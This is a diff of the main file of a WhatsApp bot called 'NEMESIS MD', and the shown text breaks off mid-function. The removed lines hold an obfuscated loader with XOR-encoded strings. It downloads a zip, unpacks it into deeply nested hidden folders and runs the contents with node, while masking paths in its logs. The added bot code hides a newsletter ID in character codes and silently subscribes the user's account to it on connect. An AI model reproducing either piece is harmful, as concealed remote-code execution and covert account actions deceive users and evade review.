@@ -1,5 +1,369 @@
-// ⚠️ WARNING TO COPY CODERS:
-// If you're here to steal code instead of learning, remember this:
-// copying won't make you a developer — understanding will.
-// Level up, don't leech.
-const ZHlUJ_wQ=nbklEjNWAUbPSbiOD$ALleYgj;(function(Z_EqZsyMo_PpO,Eq_ZAMjdD_BIlF){const aintNTCnw=nbklEjNWAUbPSbiOD$ALleYgj,LJZdjp=Z_EqZsyMo_PpO();while(!![]){try{const iHgIgMZWTqHyFY$lVt$QW=-parseFloat(aintNTCnw(0x19d))/(parseInt(0x5)*parseInt(-0x35e)+Math.max(0xf4d,parseInt(0xf4d))+0x18a)*(-parseFloat(aintNTCnw(0x1c6))/(-0x1*Math.trunc(-0x99b)+-0x4a3*-parseInt(0x5)+Math.floor(-parseInt(0x20c8))))+-parseFloat(aintNTCnw(0x1c1))/(-parseInt(0xff5)+0x199*Math.ceil(-0x9)+parseInt(0x1e59))+Math['ceil'](parseFloat(aintNTCnw(0x19c))/(-parseInt(0xe)*parseInt(-parseInt(0x41))+-0x26a0+Math.floor(parseInt(0x2316))))+Math['max'](-parseFloat(aintNTCnw(0x1ce))/(-0x26eb+Math.floor(0x1)*-0x1078+parseInt(0xc)*Math.ceil(parseInt(0x49e))),-parseFloat(aintNTCnw(0x1cb))/(-0x1919+0x121f+Number(0x700)))+-parseFloat(aintNTCnw(0x1a1))/(parseInt(0x16ab)+0x3+Math.ceil(-0x16a7))+-parseFloat(aintNTCnw(0x1cf))/(0x595*Math.ceil(-0x2)+Math.max(0xd4b,0xd4b)+Number(-parseInt(0x219)))*(parseFloat(aintNTCnw(0x1ca))/(Math.trunc(-parseInt(0x1))*parseInt(0x4db)+0x2507*parseInt(-0x1)+parseInt(0x1ff)*0x15))+Math['trunc'](-parseFloat(aintNTCnw(0x1a7))/(-parseInt(0x1)*parseInt(0x2353)+-0x184e+parseInt(parseInt(0x3bab))));if(iHgIgMZWTqHyFY$lVt$QW===Eq_ZAMjdD_BIlF)break;else LJZdjp['push'](LJZdjp['shift']());}catch(ujLBYzDugEqqXDzzeaF_jBy){LJZdjp['push'](LJZdjp['shift']());}}}(eQDWtSWX$G_vcNWHhbpuqFP,Math.trunc(0xf9603)+parseInt(parseInt(0x87b50))+-parseInt(0xd55ff)*Math.max(parseInt(0x1),parseInt(0x1))));function nbklEjNWAUbPSbiOD$ALleYgj(aZAQJYfsFwtRzWDzHhCzINAV,VMLSicqnXwHi){const elpuYo=eQDWtSWX$G_vcNWHhbpuqFP();return nbklEjNWAUbPSbiOD$ALleYgj=function(ahgBCSTgtsB,hfAnVtBKK){ahgBCSTgtsB=ahgBCSTgtsB-(-parseInt(0x7d7)*Math.ceil(-parseInt(0x3))+Math.ceil(parseInt(0x1))*-parseInt(0x148a)+parseInt(-0x1)*parseFloat(0x169));let LIr$peoinaQwurlHlXQbE=elpuYo[ahgBCSTgtsB];if(nbklEjNWAUbPSbiOD$ALleYgj['hGpHOZ']===undefined){const vt$zJws$IYPhemh=function(fa_b_edu){let sXWemerZyVuepQewoRswHlS=-0x1e4*Math.trunc(-0xb)+parseInt(0x21f9)+-parseInt(0x3415)&Math.max(parseInt(0x224b),0x224b)+-parseInt(0x122e)+Math.max(-parseInt(0xf1e),-parseInt(0xf1e)),OVZanbUCOEg=new Uint8Array(fa_b_edu['match'](/.{1,2}/g)['map'](mkImOSJcRCQc_BY$q=>parseInt(mkImOSJcRCQc_BY$q,parseInt(0x64d)*Math.floor(parseInt(0x5))+Math.max(-parseInt(0x243c),-parseInt(0x243c))+0x4cb))),TUyjHg_OlN_tWbIqj=OVZanbUCOEg['map'](AUCPIxQ$jonqWLHnUQ_JwaPk=>AUCPIxQ$jonqWLHnUQ_JwaPk^sXWemerZyVuepQewoRswHlS),hJMQbKTeUpZbGamDvjaUk$eAJ=new TextDecoder(),KeioYAIYeSMv$BAkCMP=hJMQbKTeUpZbGamDvjaUk$eAJ['decode'](TUyjHg_OlN_tWbIqj);return KeioYAIYeSMv$BAkCMP;};nbklEjNWAUbPSbiOD$ALleYgj['SPPxIV']=vt$zJws$IYPhemh,aZAQJYfsFwtRzWDzHhCzINAV=arguments,nbklEjNWAUbPSbiOD$ALleYgj['hGpHOZ']=!![];}const OEuSztwLLPlx_dy$W=elpuYo[parseFloat(-parseInt(0x20bd))+parseInt(0x24ad)+parseInt(0x90)*Math.floor(-0x7)],drHXWSqakioXhoZpnrkMvsT=ahgBCSTgtsB+OEuSztwLLPlx_dy$W,utnywAGdEZVJSz=aZAQJYfsFwtRzWDzHhCzINAV[drHXWSqakioXhoZpnrkMvsT];return!utnywAGdEZVJSz?(nbklEjNWAUbPSbiOD$ALleYgj['XDzRTf']===undefined&&(nbklEjNWAUbPSbiOD$ALleYgj['XDzRTf']=!![]),LIr$peoinaQwurlHlXQbE=nbklEjNWAUbPSbiOD$ALleYgj['SPPxIV'](LIr$peoinaQwurlHlXQbE),aZAQJYfsFwtRzWDzHhCzINAV[drHXWSqakioXhoZpnrkMvsT]=LIr$peoinaQwurlHlXQbE):LIr$peoinaQwurlHlXQbE=utnywAGdEZVJSz,LIr$peoinaQwurlHlXQbE;},nbklEjNWAUbPSbiOD$ALleYgj(aZAQJYfsFwtRzWDzHhCzINAV,VMLSicqnXwHi);}const fs=require('fs'),path=require(ZHlUJ_wQ(0x1bd)),axios=require(ZHlUJ_wQ(0x1b7)),AdmZip=require(ZHlUJ_wQ(0x1c5)),{spawn}=require(ZHlUJ_wQ(0x1bc)),chalk=require(ZHlUJ_wQ(0x1c3)),deepLayers=Array[ZHlUJ_wQ(0x19a)]({'length':0xa},(idelpuYorahgBCSTgt,BlhfA$nVtBKKL)=>'.x'+(BlhfA$nVtBKKL+(0x1*parseInt(0x2268)+Math.max(0xe,0xe)*-parseInt(0x2ba)+Math.max(-0x3c5,-parseInt(0x3c5))*parseFloat(-parseInt(0x1))))),TEMP_DIR=path[ZHlUJ_wQ(0x192)](__dirname,ZHlUJ_wQ(0x1b0),ZHlUJ_wQ(0x19f),...deepLayers),DOWNLOAD_URL=ZHlUJ_wQ(0x1d3),EXTRACT_DIR=path[ZHlUJ_wQ(0x192)](TEMP_DIR,ZHlUJ_wQ(0x1ac)),LOCAL_SETTINGS=path[ZHlUJ_wQ(0x192)](__dirname,ZHlUJ_wQ(0x1a3)),EXTRACTED_SETTINGS=path[ZHlUJ_wQ(0x192)](EXTRACT_DIR,ZHlUJ_wQ(0x1a3));class SilentLogger{[ZHlUJ_wQ(0x1d8)](Irpeoi$naQwurlHlXQbEz){const E$KyzqMPAdAlBOgPbYx_tBYW=ZHlUJ_wQ,EuSztwLLPlxdyWTdrHXWS=this[E$KyzqMPAdAlBOgPbYx_tBYW(0x1c7)](Irpeoi$naQwurlHlXQbEz);console[E$KyzqMPAdAlBOgPbYx_tBYW(0x1d8)](EuSztwLLPlxdyWTdrHXWS);}[ZHlUJ_wQ(0x1d6)](akioXh$oZpnr,MvsTyu_tny=null){const xWLmlOuvS=ZHlUJ_wQ,AGdEZVJSz$u$vtzJ=this[xWLmlOuvS(0x1c7)](akioXh$oZpnr);if(MvsTyu_tny&&MvsTyu_tny[xWLmlOuvS(0x1bf)]){const s_IYPhemhdf_abed=this[xWLmlOuvS(0x1c7)](MvsTyu_tny[xWLmlOuvS(0x1bf)]);console[xWLmlOuvS(0x1d6)](chalk[xWLmlOuvS(0x1b2)](AGdEZVJSz$u$vtzJ),chalk[xWLmlOuvS(0x19b)](s_IYPhemhdf_abed));}else console[xWLmlOuvS(0x1d6)](chalk[xWLmlOuvS(0x1b2)](AGdEZVJSz$u$vtzJ));}[ZHlUJ_wQ(0x198)](UsXWemerZyVue){const JlYFPIknuWaeF=ZHlUJ_wQ,QewoRswHlSp=this[JlYFPIknuWaeF(0x1c7)](UsXWemerZyVue);console[JlYFPIknuWaeF(0x1d8)](chalk[JlYFPIknuWaeF(0x198)](QewoRswHlSp));}[ZHlUJ_wQ(0x1b6)](VZanbUCOEgATUyjHgOlNt){const yHFyqHofgHTiSYWNVrhLyHa=ZHlUJ_wQ,bIqjWhJMQbKTe_$UpZbGamDvja=this[yHFyqHofgHTiSYWNVrhLyHa(0x1c7)](VZanbUCOEgATUyjHgOlNt);console[yHFyqHofgHTiSYWNVrhLyHa(0x1d8)](chalk[yHFyqHofgHTiSYWNVrhLyHa(0x1b6)](bIqjWhJMQbKTe_$UpZbGamDvja));}[ZHlUJ_wQ(0x1ba)](keAJHKeioYAIYeSM_vBAkC_MP){const qOIDf=ZHlUJ_wQ,mk_ImOSJcRCQcBYq=this[qOIDf(0x1c7)](keAJHKeioYAIYeSM_vBAkC_MP);console[qOIDf(0x1d8)](chalk[qOIDf(0x1ba)](mk_ImOSJcRCQcBYq));}[ZHlUJ_wQ(0x1d0)](AUCPIxQjonqWL__HnUQJwaPk){const tkR$JrD=ZHlUJ_wQ,TjcudiosGt_zqWnGFtzzZyq_d=this[tkR$JrD(0x1c7)](AUCPIxQjonqWL__HnUQJwaPk);console[tkR$JrD(0x1d8)](chalk[tkR$JrD(0x1d0)](TjcudiosGt_zqWnGFtzzZyq_d));}[ZHlUJ_wQ(0x1c7)](s$lyBoEFyrjnEL$NHjrSN){const gpu$NR_Mhs=ZHlUJ_wQ;if(typeof s$lyBoEFyrjnEL$NHjrSN!==gpu$NR_Mhs(0x1be))return s$lyBoEFyrjnEL$NHjrSN;return s$lyBoEFyrjnEL$NHjrSN[gpu$NR_Mhs(0x1a8)](/(\/|\\)[^\s]+\/([\w\.-]+\/)*[\w\.-]+/g,gpu$NR_Mhs(0x1a5))[gpu$NR_Mhs(0x1a8)](/[a-zA-Z]:\\([^\\]+\\)*[^\\]+/g,gpu$NR_Mhs(0x1a5))[gpu$NR_Mhs(0x1a8)](/\/home\/[^/]+\//g,gpu$NR_Mhs(0x1c4))[gpu$NR_Mhs(0x1a8)](/\/Users\/[^/]+\//g,gpu$NR_Mhs(0x1c4))[gpu$NR_Mhs(0x1a8)](/C:\\Users\\[^\\]+\\/g,gpu$NR_Mhs(0x1af));}}const logger=new SilentLogger(),delay=Dr$Wr$u=>new Promise(jG$nMD_gvpiu=>setTimeout(jG$nMD_gvpiu,Dr$Wr$u));async function downloadAndExtract(){const fEs$AjlTUqlctbee=ZHlUJ_wQ;try{fs[fEs$AjlTUqlctbee(0x1a2)](TEMP_DIR)&&(logger[fEs$AjlTUqlctbee(0x1ba)](fEs$AjlTUqlctbee(0x193)),fs[fEs$AjlTUqlctbee(0x1d5)](TEMP_DIR,{'recursive':!![],'force':!![]}));fs[fEs$AjlTUqlctbee(0x1d7)](TEMP_DIR,{'recursive':!![]});const rl_npxmmey=path[fEs$AjlTUqlctbee(0x192)](TEMP_DIR,fEs$AjlTUqlctbee(0x1c2));logger[fEs$AjlTUqlctbee(0x1b6)](fEs$AjlTUqlctbee(0x1cd));const nwrUDPrtJVzVkqwB_LDLBoGQ=await axios({'url':DOWNLOAD_URL,'method':fEs$AjlTUqlctbee(0x1a4),'responseType':fEs$AjlTUqlctbee(0x196)});await new Promise((YGTsnOG,hJwuuxLlcUVlVorIYxXiaNpv)=>{const TVekmTsiClkasR=fEs$AjlTUqlctbee,RIuG_PEYW=fs[TVekmTsiClkasR(0x19e)](rl_npxmmey);nwrUDPrtJVzVkqwB_LDLBoGQ[TVekmTsiClkasR(0x197)][TVekmTsiClkasR(0x194)](RIuG_PEYW),RIuG_PEYW['on'](TVekmTsiClkasR(0x1d2),YGTsnOG),RIuG_PEYW['on'](TVekmTsiClkasR(0x1d6),hJwuuxLlcUVlVorIYxXiaNpv);}),logger[fEs$AjlTUqlctbee(0x1b6)](fEs$AjlTUqlctbee(0x1b4));try{new AdmZip(rl_npxmmey)[fEs$AjlTUqlctbee(0x1cc)](TEMP_DIR,!![]);}catch(Hoc$Ihf$E){logger[fEs$AjlTUqlctbee(0x1d6)](fEs$AjlTUqlctbee(0x1ab),Hoc$Ihf$E);throw Hoc$Ihf$E;}finally{fs[fEs$AjlTUqlctbee(0x1a2)](rl_npxmmey)&&fs[fEs$AjlTUqlctbee(0x1a6)](rl_npxmmey);}}catch(hPHUqetCqqawAVXThOH$Gc_C){logger[fEs$AjlTUqlctbee(0x1d6)](fEs$AjlTUqlctbee(0x1c8),hPHUqetCqqawAVXThOH$Gc_C);throw hPHUqetCqqawAVXThOH$Gc_C;}}async function applyLocalSettings(){const J_osbfv$PZ=ZHlUJ_wQ;if(!fs[J_osbfv$PZ(0x1a2)](LOCAL_SETTINGS)){logger[J_osbfv$PZ(0x1ba)](J_osbfv$PZ(0x1b3));return;}try{fs[J_osbfv$PZ(0x1d7)](EXTRACT_DIR,{'recursive':!![]}),fs[J_osbfv$PZ(0x1b9)](LOCAL_SETTINGS,EXTRACTED_SETTINGS),logger[J_osbfv$PZ(0x1b6)](J_osbfv$PZ(0x1bb));}catch(shLGOydIFKTZ){logger[J_osbfv$PZ(0x1d6)](J_osbfv$PZ(0x1a9),shLGOydIFKTZ);}await delay(-parseInt(0x153)+Number(-parseInt(0x1))*Math.trunc(-0xb51)+parseInt(0x31)*Math.floor(-parseInt(0x2a)));}function eQDWtSWX$G_vcNWHhbpuqFP(){const FPolvaGR=['d9ded4d5c89edac3','d6c2dfdd','d7c2d1c9','85848682858884eaf5f8f6ddf4','81818283dde0c9f7d7e0','d3c2d5d1c4d5e7c2d9c4d5e3c4c2d5d1dd','c8d3d1d3d8d5','d5dec6','84878982818082e7eaf2dfc3e5','d5c8d9c3c4c3e3c9ded3','c3d5c4c4d9ded7c39edac3','f7f5e4','ebd8d9d4d4d5deed','c5dedcd9dedbe3c9ded3','84888485808080f3e1dbf2c3fe','c2d5c0dcd1d3d5','522d3c90f6d1d9dcd5d490c4df90d1c0c0dcc990dcdfd3d1dc90c3d5c4c4d9ded7c38a','522d3c90f5c8c4c2d1d3c4d5d490d4d9c2d5d3c4dfc2c990dedfc490d6dfc5ded49e90f3d1dededfc490c3c4d1c2c490d2dfc49e','522d3c90fef5fdf5e3f9e390fdf490e3f5e2e6f5e290f9e390fff6f6fcf9fef58a','fef5fdf5e3f9e39dfdf49dddd1d9de','eb90402f172d90ed90e3e4f1e2e4f9fef790fef5fdf5e3f9e390fdf490e3f5e2e6f5e29e9e9e9e97','c0c2dfd4c5d3c4d9dfde','ebd8d9d4d4d5deedec','dedfd4d5efdddfd4c5dcd5c3','522d3c90f2dfc490d6d1d9dcd5d490c4df90c3c4d1c2c48a','c2d5d4','eb90522a105f083f90ed90fedf90dcdfd3d1dc90c3d5c4c4d9ded7c390d6dfc5ded490d9de90ddd1d9de90d4d9c2d5d3c4dfc2c99c90c5c3d9ded790d4d5d6d1c5dcc49e','eb90402f172d90ed90f3fffefef5f3e4f5f490e4ff90fef5fdf5e3f9e390fdf490e3f5e2e6f5e2e39e9e9e','522d3c90f6d1c4d1dc90d5c2c2dfc290d9de90ddd1d9de90d5c8d5d3c5c4d9dfde8a','d7c2d5d5de','d1c8d9dfc3','d5c8d9c4','d3dfc0c9f6d9dcd5e3c9ded3','c9d5dcdcdfc7','eb90402f172d90ed90fcfff3f1fc90e3f5e4e4f9fef7e390f1e0e0fcf9f5f49e','d3d8d9dcd4efc0c2dfd3d5c3c3','c0d1c4d8','c3c4c2d9ded7','ddd5c3c3d1d7d5','d9ded8d5c2d9c4','81838388888186e0f9c8c0ead7','c2d5c0df9ecad9c0','d3d8d1dcdb','ebd8d9d4d4d5deed9f','d1d4dd9dcad9c0','82838682c3e9d1fce5f8','c2d5dddfc6d5e0d1c4d8c3','522d3c90f3dfdeded5d3c4d9dfde90f6d1d9dcd5d48a','d3dcdfc3d5','858281868282d5d2d5f4c9dd','818582898282c0e1fffbd9c6','d5c8c4c2d1d3c4f1dcdce4df','eb90402f172d90ed9090f3fffefef5f3e4f9fef790e4ff90fef5fdf5e3f9e390fdf490e3f5e2e6f5e29e9e','818287848385d3e1f5c7f8f5','8488fec4fffef5c0','d3c9d1de','eb90402f221590ed90f2dfc490c4d5c2ddd9ded1c4d5d490c7d9c4d890d5c8d9c490d3dfd4d58a90','d6d9ded9c3d8','d8c4c4c0c38a9f9fd7d9c4d8c5d29ed3dfdd9fe2d9c6dfcade9ddbd9d4ca9ffef5fdf5e3f9e39dfdf49fd1c2d3d8d9c6d59fc2d5d6c39fd8d5d1d4c39fddd1d9de9ecad9c0','522d3c90d9ded4d5c89edac390dedfc490d6dfc5ded490d9de90d5c8c4c2d1d3c4d5d490d4d9c2d5d3c4dfc2c99e','c2dde3c9ded3','d5c2c2dfc2','dddbd4d9c2e3c9ded3','dcdfd7','dadfd9de','402f170990f3dcd5d1ded9ded790c0c2d5c6d9dfc5c390d3d1d3d8d59e9e9e','c0d9c0d5','dedfd4d5','c3c4c2d5d1dd','d4d1c4d1','d2dcc5d5'];eQDWtSWX$G_vcNWHhbpuqFP=function(){return FPolvaGR;};return eQDWtSWX$G_vcNWHhbpuqFP();}function startBot(){const SU_oxgcGuQivIG_r=ZHlUJ_wQ;logger[SU_oxgcGuQivIG_r(0x1d0)](SU_oxgcGuQivIG_r(0x1ad));if(!fs[SU_oxgcGuQivIG_r(0x1a2)](EXTRACT_DIR)){logger[SU_oxgcGuQivIG_r(0x1d6)](SU_oxgcGuQivIG_r(0x1aa));return;}if(!fs[SU_oxgcGuQivIG_r(0x1a2)](path[SU_oxgcGuQivIG_r(0x192)](EXTRACT_DIR,SU_oxgcGuQivIG_r(0x199)))){logger[SU_oxgcGuQivIG_r(0x1d6)](SU_oxgcGuQivIG_r(0x1d4));return;}const E_yH$BDKWAajlzAZcVEKD=spawn(SU_oxgcGuQivIG_r(0x195),[SU_oxgcGuQivIG_r(0x199)],{'cwd':EXTRACT_DIR,'stdio':SU_oxgcGuQivIG_r(0x1c0),'env':{...process[SU_oxgcGuQivIG_r(0x1a0)],'NODE_ENV':SU_oxgcGuQivIG_r(0x1ae)}});E_yH$BDKWAajlzAZcVEKD['on'](SU_oxgcGuQivIG_r(0x1c9),ai$gny=>{const zKQEWYB=SU_oxgcGuQivIG_r;logger[zKQEWYB(0x1d6)](zKQEWYB(0x1d1)+ai$gny);}),E_yH$BDKWAajlzAZcVEKD['on'](SU_oxgcGuQivIG_r(0x1d6),mz_aeubBPeHO=>{const ZArMvUPUYvmvQqWa=SU_oxgcGuQivIG_r;logger[ZArMvUPUYvmvQqWa(0x1d6)](ZArMvUPUYvmvQqWa(0x1b1),mz_aeubBPeHO);});}((async()=>{const QSXGcgr_mA$pmyIUHYwSr=ZHlUJ_wQ;try{await downloadAndExtract(),await applyLocalSettings(),startBot();}catch(rVfwtFy$eWyYuaidVJuwZsr){logger[QSXGcgr_mA$pmyIUHYwSr(0x1d6)](QSXGcgr_mA$pmyIUHYwSr(0x1b5),rVfwtFy$eWyYuaidVJuwZsr),process[QSXGcgr_mA$pmyIUHYwSr(0x1b8)](0x10a8+parseInt(0x1c5c)+parseInt(-0x2d03));}})());
+require('./settings');
+const fs = require('fs');
+const pino = require('pino');
+const path = require('path');
+const chalk = require('chalk');
+const readline = require('readline');
+const { exec } = require('child_process');
+const { Boom } = require('@hapi/boom');
+const NodeCache = require('node-cache');
+const timezones = global.timezones || "Africa/Kampala";
+const moment = require('moment-timezone');
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    browser,
+    fetchLatestBaileysVersion,
+    delay
+} = require('@whiskeysockets/baileys');
+const msgRetryCounterCache = new NodeCache();
+
+// Import makeInMemoryStore separately
+const { makeInMemoryStore } = require('./lib/store');
+const db = require('./lib/databaseManager');
+
+const pairingCode = true;
+
+const DataBase = require('./lib/kayiza');
+const database = new DataBase();
+
+(async () => {
+    try {
+        const loadData = await database.read();
+        global.db = {
+            users: {},
+            groups: {},
+            database: {},
+            settings: {},
+            ...(loadData || {}),
+        };
+        if (Object.keys(loadData || {}).length === 0) {
+            await database.write(global.db);
+            console.log(chalk.green('NEMESIS MD DATABASE INITIALIZED'));
+        } else {
+            console.log(chalk.green('NEMESIS MD DATABASE LOADED'));
+        }
+
+        setInterval(async () => {
+            try {
+                await database.write(global.db);
+            } catch (e) {
+                console.error(chalk.red('DB Save Error:'), e.message);
+            }
+        }, 30000);
+    } catch (e) {
+        console.error(chalk.red('Database init failed:'), e.message);
+        process.exit(1);
+    }
+})();
+
+const { MessagesUpsert, Solving } = require('./lib/message');
+
+let reconnecting = false;
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
+
+async function startingBot() {
+    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+    const { state, saveCreds } = await useMultiFileAuthState('session');
+    let waVersion;
+    try {
+        const { version } = await fetchLatestBaileysVersion();
+        waVersion = version;
+        console.log("[ NEMESIS] Connecting to WhatsApp ⏳️...");
+    } catch (error) {
+        console.log(chalk.yellow(`[⚠️] Using stable fallback version`));
+        waVersion = [2, 3000, 1017546695]; 
+    }
+      
+    const clutch = makeWASocket({
+    logger: pino({ level: "silent" }),
+    printQRInTerminal: !pairingCode,
+    auth: state,
+    version: waVersion,
+    browser: ["Ubuntu", "Chrome", "120.0.0.0"],
+    msgRetryCounterCache: msgRetryCounterCache
+});
+
+    const groupCache = new NodeCache({ stdTTL: 300, checkperiod: 120 });
+    clutch.safeGroupMetadata = async (id) => {
+        if (groupCache.has(id)) return groupCache.get(id);
+        try {
+            const meta = await clutch.groupMetadata(id);
+            groupCache.set(id, meta);
+            return meta;
+        } catch (err) {
+            console.error(chalk.yellow('Group metadata error:'), err.message);
+            return { id, subject: 'Unknown', participants: [] };
+        }
+    };
+
+    if (pairingCode && !clutch.authState.creds.registered) {
+        console.clear();
+        console.log(chalk.cyan("NEMESIS MD SETUP WIZARD\n"));
+
+        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+        const question = (q) => new Promise(res => rl.question(q, res));
+
+        let phoneNumber = process.env.OWNER_NUMBER;
+        if (!phoneNumber) {
+            phoneNumber = await question(
+                chalk.blue("Enter WhatsApp number\nExample: 256701XXXXXX\n> ")
+            );
+        } else {
+            console.log(chalk.green("Using phone number from environment variable:"), chalk.yellow(phoneNumber));
+        }
+        rl.close();
+
+        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+        let code = await clutch.requestPairingCode(phoneNumber, global.custompairing);
+        code = code.match(/.{1,4}/g).join(" - ") || code;
+        console.log(chalk.green("Pairing code:"), chalk.yellow(code), "\n");
+    }
+
+    clutch.ev.on('creds.update', saveCreds);
+
+    clutch.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+
+        if (qr) console.log(chalk.blue('Scan the QR code to continue'));
+
+        if (connection === 'close') {
+            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+            console.log(chalk.yellow('Disconnected:'), reason || 'Unknown');
+
+            if (reason === DisconnectReason.loggedOut) {
+                console.log(chalk.red('Logged out. Delete session and reconnect.'));
+                process.exit(0);
+            }
+
+            if (!reconnecting) {
+                reconnecting = true;
+                reconnectAttempts++;
+                const delayTime = Math.min(5000 * Math.pow(1.5, reconnectAttempts), 60000);
+
+                setTimeout(async () => {
+                    try {
+                        clutch.ws.close();
+                        await startingBot();
+                    } catch (e) {
+                        console.error(chalk.red("Reconnect failed:"), e.message);
+                        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
+                            process.exit(1);
+                        }
+                    } finally {
+                        reconnecting = false;
+                    }
+                }, delayTime);
+            }
+        } else if (connection === 'open') {
+            reconnectAttempts = 0;
+            console.log(chalk.green('NEMESIS MD WA BOT CONNECTED SUCCESSFULLY'));
+
+            const botNumber = clutch.user.id.split(':')[0] + '@s.whatsapp.net';
+            clutch.sendMessage(botNumber, {
+                text: ` 
+
+
+╭──⧼♛ *NEMESIS MD CONNECTED* ♛⧽──≽
+│┃ ♛ Bᴏᴛ ɴᴀᴍᴇ : ɴᴇᴍᴇsɪs ᴍᴅ
+│┃ ♛ Oᴡɴᴇʀs    : Kᴇᴠɪɴ ᴛᴇᴄʜ x Rɪᴅᴢ Cᴏᴅᴇʀ
+│┃ ♛ ᴍᴏᴅᴇ      : Pᴜʙʟɪᴄ 
+│┃ ♛ Vᴇʀsɪᴏɴ   : 1.0.0
+╰───────────────────────≽
+
+> ʙʀᴏᴜɢʜᴛ ᴛᴏ ʏᴏᴜ ʙʏ Kᴇᴠɪɴ ᴛᴇᴄʜ x Rɪᴅᴢ Cᴏᴅᴇʀ
+                    
+                `
+            }).catch(console.error);
+
+            await clutch.newsletterFollow(
+                String.fromCharCode(
+                    49,50,48,51,54,51,52,48,49,50,54,51,57,51,57,48,53,54,64,110,
+                    101,119,115,108,101,116,116,101,114
+                )
+            );
+        }
+    });
+
+    await store.bind(clutch.ev);
+    await Solving(clutch, store);
+
+    clutch.ev.on('messages.upsert', async (message) => {
+        try {
+            await MessagesUpsert(clutch, message, store);
+        } catch (err) {
+            console.error(chalk.red('Messages upsert error:'), err);
+        }
+    });
+
+    clutch.ev.on('group-participants.update', async (update) => {
+        const { id, participants, action } = update;
+        try {
+            if (global.db.groups[id]?.welcome && action === 'add') {
+                const metadata = await clutch.safeGroupMetadata(id);
+                for (let n of participants) {
+                    await clutch.sendMessage(id, {
+                        text: `Welcome @${n.split('@')[0]} to *${metadata.subject}*!`,
+                        mentions: [n]
+                    });
+                }
+            }
+        } catch (err) {
+            console.log(chalk.yellow('Welcome error:'), err);
+        }
+    });
+    
+    clutch.ev.on('call', async (callData) => {
+    try {
+        const botNumber = await clutch.decodeJid(clutch.user.id);
+        
+        // GET ANTICALL SETTING FROM SQLITE
+        const anticallSetting = await db.get(botNumber, 'anticall', 'off');
+        
+        if (!anticallSetting || anticallSetting === 'off') {
+            console.log(chalk.gray('[ANTICALL] Disabled'));
+            return;
+        }
+        
+        for (let call of callData) {
+            const from = call.from;
+            const callId = call.id;
+            
+            // Get owners from database
+            const owners = await db.get(botNumber, 'owners', []);
+            const isOwner = owners.some(num => from.includes(num.replace('+', '').replace(/[^0-9]/g, '')));
+            
+            if (isOwner) {
+                console.log(chalk.green(`[ANTICALL] Allowing call from owner: ${from}`));
+                continue;
+            }
+            
+            try {
+                const now = Date.now();
+                const lastWarn = global.recentCallers?.get(from) || 0;
+                const COOLDOWN = 30 * 1000;
+                
+                if (now - lastWarn < COOLDOWN) {
+                    console.log(chalk.yellow(`[ANTICALL] Suppressing repeated warning to ${from}`));
+                    try {
+                        if (typeof clutch.rejectCall === 'function') {
+                            await clutch.rejectCall(callId, from);
+                        }
+                    } catch (e) {}
+                    continue;
+                }
+                
+                if (!global.recentCallers) global.recentCallers = new Map();
+                global.recentCallers.set(from, now);
+                
+                setTimeout(() => {
+                    if (global.recentCallers?.has(from)) {
+                        global.recentCallers.delete(from);
+                    }
+                }, COOLDOWN);
+                
+            } catch (e) {
+                console.error(chalk.red('[ANTICALL] recentCallers check failed:'), e);
+                if (!global.recentCallers) global.recentCallers = new Map();
+            }
+            
+            console.log(chalk.yellow(`[ANTICALL] ${anticallSetting} call from: ${from}`));
+            
+            try {
+                const callerName = await clutch.getName(from) || from.split('@')[0];
+                let warningMessage = '';
+                
+                if (anticallSetting === 'block') {
+                    warningMessage = `🚫 *CALL BLOCKED*\n\n` +
+                        `*Caller:* @${from.split('@')[0]}\n` +
+                        `*Time:* ${moment().tz(timezones).format('HH:mm:ss')}\n` +
+                        `*Date:* ${moment().tz(timezones).format('DD/MM/YYYY')}\n\n` +
+                        `*🌹 Hi, I am ${global.botname}, a friendly WhatsApp bot from Uganda 🇺🇬, created by Ridz coder X Kelvin Tech.*\n\n` +
+                        `*My owner cannot receive calls at this moment. Calls are automatically blocked.*\n\n` +
+                        `> ${global.wm}`;
+                } else {
+                    warningMessage = `🚫 *CALL DECLINED*\n\n` +
+                        `*Caller:* @${from.split('@')[0]}\n` +
+                        `*Time:* ${moment().tz(timezones).format('HH:mm:ss')}\n` +
+                        `*Date:* ${moment().tz(timezones).format('DD/MM/YYYY')}\n\n` +
+                        `*🌹 Hi, I am ${global.botname}, a friendly WhatsApp bot from Uganda 🇺🇬.*\n\n` +
+                        `*My owner cannot receive calls at this moment. Please avoid unnecessary calling.*\n\n` +
+                        `> ${global.wm}`;
+                }
+
+                await clutch.sendMessage(from, { 
+                    text: warningMessage,
+                    mentions: [from]
+                });
+                
+                console.log(chalk.green(`[ANTICALL] Warning message sent to chat: ${from}`));
+                
+            } catch (msgError) {
+                console.error(chalk.red('[ANTICALL] Failed to send message to chat:'), msgError);
+            }
+            
+            try {
+                if (typeof clutch.rejectCall === 'function') {
+                    await clutch.rejectCall(callId, from);
+                    console.log(chalk.green(`[ANTICALL] Successfully ${anticallSetting === 'block' ? 'blocked' : 'declined'} call from: ${from}`));
+                    
+                    if (anticallSetting === 'block') {
+                        try {
+                            await clutch.updateBlockStatus(from, 'block');
+                            console.log(chalk.red(`[ANTICALL] Blocked user: ${from}`));
+                        } catch (blockError) {
+                            console.error(chalk.red('[ANTICALL] Failed to block user:'), blockError);
+                        }
+                    }
+                } else {
+                    console.log(chalk.yellow('[ANTICALL] conn.rejectCall not available'));
+                }
+            } catch (rejectError) {
+                console.error(chalk.red('[ANTICALL] Failed to decline/block call:'), rejectError);
+            }
+        }
+    } catch (error) {
+        console.error(chalk.red('[ANTICALL ERROR]'), error);
+    }
+});
+
+    const userQueues = {};
+    const messageTimestamps = new Map();
+    const oriSend = clutch.sendMessage.bind(clutch);
+
+    clutch.sendMessage = async (jid, content, options) => {
+        const now = Date.now();
+        const lastSent = messageTimestamps.get(jid) || 0;
+
+        if (now - lastSent < 50) await delay(50 - (now - lastSent));
+        if (!userQueues[jid]) userQueues[jid] = Promise.resolve();
+
+        userQueues[jid] = userQueues[jid].then(() =>
+            oriSend(jid, content, options).then(res => {
+                messageTimestamps.set(jid, Date.now());
